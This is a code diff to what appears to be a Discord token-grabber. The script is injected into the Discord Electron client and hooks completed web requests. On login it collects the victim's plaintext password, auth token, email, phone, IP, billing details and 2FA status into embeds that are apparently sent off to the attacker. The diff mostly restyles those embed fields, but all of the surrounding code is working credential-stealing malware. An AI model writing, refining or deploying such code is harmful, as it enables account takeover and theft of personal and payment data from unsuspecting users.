@@ -222,10 +222,10 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`);
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`);
         var params = await makeEmbed({
+            name: `\`${user.username}\``,
             title: "User Information",
             fields: [
                 { name: "IP", value: `\`${ip}\``, inline: false },
-                { name: "Username", value: `\`${user.username}\``, inline: false },
                 { name: "ID", value: `\`${user.id}\``, inline: false },
                 { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
                 { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
@@ -343,54 +343,23 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                fields: [{
-                    name: "Info",
-                    value: `\`${ip}\``,
-                    inline: !0
-                }, {
-                    name: "Username <:username:1041634536733290596> ",
-                    value: `\`${user.username}#${user.discriminator}\``,
-                    inline: !0
-                }, {
-                    name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\``,
-                    inline: !0
-                }, {
-                    name: "Nitro <a:nitro:1041639670288748634>",
-                    value: `${GetNitro(Nitro)}`,
-                    inline: !0
-                }, {
-                    name: "NSFW <a:nsfw:1041640474617839616>",
-                    value: `${GetNSFW(user.nsfw_allowed)}`,
-                    inline: !1
-                }, {
-                    name: "A2F <a:a2f:1040272766982692885>",
-                    value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !1
-                }, {
-                    name: "Billing <a:billing:1041641103629234196>",
-                    value: `${Billings}`,
-                    inline: !1
-                }, {
-                    name: "Email <a:email:1041639672037785691>",
-                    value: `\`${user.email}\``,
-                    inline: !0
-                }, {
-                    name: "Phone :mobile_phone:",
-                    value: `\`${user.phone ?? "None"}\``,
-                    inline: !0
-                }, {
-                    name: "<a:password:1041639669047238676> Password",
-                    value: `\`${password}\``,
-                    inline: !0
-                }, {
-                    name: "<a:tokens:1041634540537511957> Token",
-                    value: `\`${token}\``,
-                    inline: !1
-                }],
-
+                name: `\`${user.username}\``,
+                title: "User Information",
+                fields: [
+                    { name: "IP", value: `\`${ip}\``, inline: false },
+                    { name: "ID", value: `\`${user.id}\``, inline: false },
+                    { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
+                    { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
+                    { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
+                    { name: "Billing", value: `${Billings}`, inline: false },
+                    { name: "Email", value: `\`${user.email}\``, inline: false },
+                    { name: "Password", value: `\`${password}\``, inline: false },
+                    { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
+                    { name: "Token", value: `\`${token}\``, inline: false }
+                ],
+                image: userBanner,
                 thumbnail: userAvatar,
-                image: userBanner
+                color: 5639644
             })
 
 
